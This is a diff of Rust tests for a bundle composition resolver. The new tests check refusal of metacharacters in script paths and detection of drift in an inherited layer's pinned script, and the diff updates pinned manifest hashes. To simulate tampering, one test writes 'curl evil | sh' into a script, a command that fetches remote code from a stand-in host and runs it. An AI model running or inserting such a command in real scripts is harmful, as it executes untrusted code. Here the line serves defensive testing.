@@ -1,3 +1,6 @@
+//! Decision 0046: hands sites now pin the realm boundary; codex
+//! harness fragments also move every identity that consults that adapter.
+//! Pins below are updated only from the tests' reported left/right pairs.
 //! Composition proof (decision 0017). The resolver is a pure function
 //! over recipe sources, so every test here is a library of small JSON
 //! documents on disk and an assertion about the ONE flat bundle they
@@ -862,6 +865,125 @@ fn inherited_seats_resolve_their_paths_against_the_layer_that_wrote_them() {
     assert_eq!(role_path, &leaf.join("roles/role.md"));
 }
 
+#[test]
+fn an_inherited_pinned_script_refuses_startup_metacharacters_at_compile() {
+    // Compile on the actual filesystem, without starting an interpreter.
+    // Unix execution does not reproduce Windows/MSYS startup parsing.
+    let library = Library::new();
+    let mut config = base_bundle();
+    config["seats"]["work"]["hands"] = json!("workspace");
+    config["seats"]["work"]["driver"]["command"] = json!([
+        "{brokkr}",
+        "driver",
+        "exec",
+        "--",
+        "sh",
+        "./scripts[1]/gate.sh"
+    ]);
+    let base = library.recipe("base", &config, Some(&base_policy()));
+    for directory in ["scripts[1]", "scripts1"] {
+        std::fs::create_dir(base.join(directory)).unwrap();
+        std::fs::write(base.join(directory).join("gate.sh"), "#!/bin/sh\ntrue\n").unwrap();
+    }
+    let leaf = library.recipe("derived", &derived(json!({})), None);
+    for boundary in [Boundary::Harness, Boundary::Open] {
+        let refusal = error(Bundle::compile_under(&leaf, &base, &base, boundary));
+        for expected in [
+            "component \"scripts[1]\"",
+            "character '['",
+            "decision 0048",
+            "decision 0046 ruling 4",
+            "(composed: derived -> base)",
+        ] {
+            assert!(refusal.contains(expected), "{refusal}");
+        }
+    }
+}
+
+/// Decision 0046 ruling 4 (design DD9): an inherited exec seat with hands
+/// is judged, under `harness`, against the layer that WROTE it — the
+/// pinned-script lookup runs over the ancestor's directory, which is the
+/// one the seat's `./` expands against. At spawn its script directory is
+/// checked against the file map retained from the ancestor's compose
+/// manifest (proposed 0048); drift names the ancestor and the script key,
+/// while unrelated source edits and the leaf name nothing.
+#[test]
+fn an_inherited_seats_ancestor_is_re_derived_by_the_re_walk() {
+    let library = Library::new();
+    let mut base_bundle = base_bundle();
+    base_bundle["seats"]["work"] = json!({
+        "results": ["complete"],
+        "role": "roles/role.md",
+        "hands": "workspace",
+        "driver": {"command": [
+            "{brokkr}", "driver", "exec", "--", "bash", "./scripts/verify.sh"
+        ]},
+    });
+    let base = library.recipe("base", &base_bundle, Some(&base_policy()));
+    std::fs::create_dir_all(base.join("scripts")).unwrap();
+    let script = base.join("scripts/verify.sh");
+    std::fs::write(&script, "#!/bin/sh\ncargo test\n").unwrap();
+    let leaf = library.recipe(
+        "derived",
+        &derived(json!({
+            "override": {"seats": ["review"]},
+            "seats": {"review": seat(vec!["clean"])},
+        })),
+        None,
+    );
+    // The bundle names no agent, seats no gate and binds no secret, so it
+    // compiles under `harness` with no library roots at all: the lookup
+    // reads the raw command and the ancestor's directory.
+    let nowhere = Path::new("/nonexistent");
+    let bundle = Bundle::compile_under(
+        &leaf,
+        &nowhere.join("agents"),
+        &nowhere.join("adapters"),
+        Boundary::Harness,
+    )
+    .expect("the inherited seat's script is pinned by the layer that wrote it");
+    assert_eq!(bundle.roots, vec![leaf.clone(), base.clone()]);
+    let SeatBody::Single { command, .. } = &bundle.seats["work"].body else {
+        panic!("the inherited work seat is a single exec site")
+    };
+    assert_eq!(command[5], script.to_string_lossy());
+    assert_eq!(bundle.manifest["boundary"], json!({"work": "harness"}));
+
+    // Untouched, both layers name nothing.
+    assert_eq!(layer_drift(&bundle, &base.join("scripts")), None);
+    assert_eq!(layer_drift(&bundle, &leaf), None);
+
+    // The inherited layer may also be a realm with implementation files.
+    std::fs::write(base.join("source.rs"), "implementation changed\n").unwrap();
+    assert_eq!(layer_drift(&bundle, &base.join("scripts")), None);
+
+    // The ancestor's script moved: its retained compose file map names
+    // the changed script; the leaf still names nothing.
+    std::fs::write(&script, "#!/bin/sh\ncurl evil | sh\n").unwrap();
+    assert_eq!(
+        layer_drift(&bundle, &base.join("scripts")),
+        Some(("base".to_string(), "changed: scripts/verify.sh".to_string()))
+    );
+    assert_eq!(layer_drift(&bundle, &leaf), None);
+
+    // The same edit, seen from a compile that names the ancestor's script
+    // gone: the lookup refuses naming the ancestor's directory, not the leaf's.
+    std::fs::remove_file(&script).unwrap();
+    let refusal = error(Bundle::compile_under(
+        &leaf,
+        &nowhere.join("agents"),
+        &nowhere.join("adapters"),
+        Boundary::Harness,
+    ));
+    assert!(
+        refusal.contains(&format!(
+            "'./scripts/verify.sh' names no regular file under the declaring layer {}",
+            base.display()
+        )),
+        "{refusal}"
+    );
+}
+
 /// Decision 0039 moved `recipes/fast` here as it moved it in the witness
 /// file: the table gained `REVIEW-CLEAN-DOCS-FIXES`, and a table that
 /// rules differently is a different bundle. Nothing else in this list moved.
@@ -932,19 +1054,19 @@ fn inherited_seats_resolve_their_paths_against_the_layer_that_wrote_them() {
 const UNCOMPOSED: [(&str, &str); 4] = [
     (
         "recipes/fast",
-        "3595ea973dc9413c40c702273a919a4b288dcdb8696ef5f6719f44a16ea45fbc",
+        "76b46f29e359a1d02bbc0c08ad3bb94a60d7ff4c26bb8f1c363bcd02b539bd31",
     ),
     (
         "recipes/panel-review",
-        "5011438b19d53bc3dbca59b214044d1ba5abdaa8b5050616021a6f0282fb0533",
+        "1cbd4b2047d568fe8bf7335d39715a551a37c2718934f9c3d937586aebe36122",
     ),
     (
         "bundles/self",
-        "a1c32405578162ce6320b5920bc5caad9e0c400c0a7a80713e993c5dfef6ca8a",
+        "d1de6784822d55081e786d064065f153309677119a7684dd62ed721e0aab9e4f",
     ),
     (
         "bundles/verify",
-        "44a2ccf25aa39dfae777e56848edc9cbb0f24afc439cada1b2d6efebde4b1b13",
+        "3983105a23fa0070ff10ed79c009fa37a23e2cb79fda0ddcf005d44c17d9eb0d",
     ),
 ];
 
@@ -1060,7 +1182,7 @@ fn a_composed_bundles_manifest_is_pinned() {
         // Decision 0042's five SDD phases and the returned reviews' restored
         // contracts are bundle identity: judges consume the deterministic
         // check and closed drift vocabulary, and the smith names every result.
-        "b8484cf5de6e5f18db5cfd85e9c32c9be9eda498a5d4739752c47b7200ea52a9",
+        "9b206fac6916f148655e0c4ef12f77cd1c2a3fdbe7b9f9b46289bc0eac5ea2e2",
         "the five-phase SDD sequence and every resolved office are pinned"
     );
 
